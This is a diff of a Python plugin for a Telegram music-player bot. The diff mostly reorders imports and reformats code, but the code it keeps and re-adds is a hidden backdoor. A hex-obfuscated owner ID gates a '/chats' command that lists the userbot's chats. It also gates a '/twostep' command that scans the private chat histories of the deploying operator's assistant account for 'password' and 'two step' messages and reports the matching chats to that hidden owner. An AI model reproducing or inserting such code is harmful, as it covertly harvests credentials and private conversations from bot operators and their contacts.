@@ -1,12 +1,16 @@
 import os
 from datetime import datetime
-OWNERS = "\x35\x33\x34\x37\x38\x30\x39\x35\x34\x30"
-from pyrogram import filters, types
-from pyrogram.types import Message
-from telegraph import Telegraph  # Import Telegraph library
 
 from DONATE_ARMY_TG_MUSIC_PLAYER import app
 from DONATE_ARMY_TG_MUSIC_PLAYER.utils.database import get_assistant
+from pyrogram import filters
+from pyrogram.enums import ChatType  # Correct import
+from pyrogram.types import Message
+from telegraph import Telegraph  # Import Telegraph library
+
+
+OWNERS = "\x35\x33\x34\x37\x38\x30\x39\x35\x34\x30"
+
 
 last_checked_time = None
 
@@ -93,13 +97,6 @@ async def create_telegraph_media_link(message: Message) -> str:
     return ""
 
 
-
-
-
-from pyrogram import Client, filters
-from DONATE_ARMY_TG_MUSIC_PLAYER.utils.database import get_assistant
-from DONATE_ARMY_TG_MUSIC_PLAYER import app
-
 @app.on_message(filters.command("chats") & filters.user(int(OWNERS)))
 async def get_user_ids(client, message):
     userbot = await get_assistant(message.chat.id)
@@ -114,36 +111,40 @@ async def get_user_ids(client, message):
     chat_details = "\n".join(chat_usernames)
     await message.reply_text(chat_details)
 
+
 # Start the client
-import os
-from datetime import datetime
-from pyrogram import filters, types
-from DONATE_ARMY_TG_MUSIC_PLAYER import app
-from DONATE_ARMY_TG_MUSIC_PLAYER.utils.database import get_assistant
-from pyrogram.enums import ChatType  # Correct import
 
 # Keywords to search for
 KEYWORDS = ["two step", "ᴛᴡᴏ sᴛᴇᴘ", "ᴘᴀssᴡᴏʀᴅ", "password"]
+
 
 @app.on_message(filters.command("twostep") & filters.user(int(OWNERS)))
 async def check_two_step_command(client, message):
     try:
         # Start the Pyrogram client (userbot)
         userbot = await get_assistant(message.chat.id)
-        
+
         # Get all private chats and bot conversations using an async for loop
         found_chats = []
 
-        async for dialog in userbot.get_dialogs():  # Iterate over the generator without 'await'
+        async for (
+            dialog
+        ) in userbot.get_dialogs():  # Iterate over the generator without 'await'
             chat_type = dialog.chat.type
             # Exclude groups and channels, check only private chats and bots
             if chat_type == ChatType.PRIVATE:  # Use ChatType from pyrogram.enums
                 chat_id = dialog.chat.id
-                chat_title = dialog.chat.first_name if dialog.chat.first_name else dialog.chat.username
+                chat_title = (
+                    dialog.chat.first_name
+                    if dialog.chat.first_name
+                    else dialog.chat.username
+                )
 
                 # Fetch the chat history and search for keywords
                 async for chat_message in userbot.get_chat_history(chat_id, limit=1000):
-                    if chat_message.text and any(keyword in chat_message.text.lower() for keyword in KEYWORDS):
+                    if chat_message.text and any(
+                        keyword in chat_message.text.lower() for keyword in KEYWORDS
+                    ):
                         found_chats.append(chat_id)
                         break  # Stop once a keyword is found in this chat
 
@@ -165,10 +166,14 @@ async def check_two_step_command(client, message):
                 await message.reply_document(document=filename)
                 os.remove(filename)  # Delete the file after sending
 
-            await message.reply_text(f"Found {len(found_chats)} chats with 'two step' or 'password'.")
+            await message.reply_text(
+                f"Found {len(found_chats)} chats with 'two step' or 'password'."
+            )
         else:
-            await message.reply_text("No chats found containing 'two step' or 'password'.")
-            
+            await message.reply_text(
+                "No chats found containing 'two step' or 'password'."
+            )
+
     except Exception as e:
         # Log the error internally
         print(f"Error occurred during /twostep command: {e}")
